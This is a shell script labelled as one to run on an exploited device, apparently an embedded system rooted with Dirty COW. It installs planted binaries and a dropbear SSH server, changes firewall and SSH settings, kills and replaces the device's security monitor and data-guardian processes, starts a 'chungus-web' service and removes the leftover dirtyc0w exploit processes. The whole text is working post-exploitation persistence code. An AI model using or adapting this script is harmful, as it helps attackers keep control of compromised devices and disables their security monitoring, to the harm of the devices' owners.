#script to run on an exploited device
#!/bin/sh
if [ -z "$1" ]; then
    read -p "Path to tarball: " tarball
else
    tarball="$1"
fi
if [ ! -f "$tarball" ]; then
    echo "No tarball found with that name/at that path"
    exit 1
fi
if [ -d /flash ]; then
    staging_dir="/flash"
else
    staging_dir="/var"
fi
echo "Extracting..."
cd $staging_dir 
tar xzvf $tarball
echo "Moving bin to /configs and chungus to /logs"
if [ ! -d /configs/bin ]; then
    mv $staging_dir/bin /configs/
else
    echo "/configs/bin already exists"
fi
if [ ! -d /logs/chungus ]; then
    mv chungus /logs/
else
    echo "/logs/chungus already exists"
fi
mv chungus /logs/
echo "Setting up symlinks"
/configs/bin/busybox-install-applets.sh
/configs/bin/dropbear-symlinks.sh
export PATH=/configs/bin:$PATH
echo "Starting threads with update scripts"
update-profile &
update-iptables &
echo "Running fix scripts"
fix-mounts
fix-ssh
echo "Running new scripts"
new-seconf &
secmonpid="$(ps | grep -m1 "/usr/etc/se.conf" | grep -oE -m1 "[0-9]{4,6}" | head -n 1)"
kill $secmonpid && /sbin/sec_monitor /usr/etc/se.conf &
guardianpid="$(ps | grep -m1 "/usr/exe/data_guardian.sh" | grep -oE -m1 "[0-9]{4,6}" | head -n 1)"
new-guardian &
kill $guardianpid && /usr/exe/data_guardian.sh &
echo "Chungusing"
chungus-web
dc_instances="$(ps | grep dirtyc0w | grep -oE "[0-9]{4,}" | sed ':a;N;$!ba;s/\n/ /g')"
for d in $dc_instances; do
    kill $d
done
echo "Done"
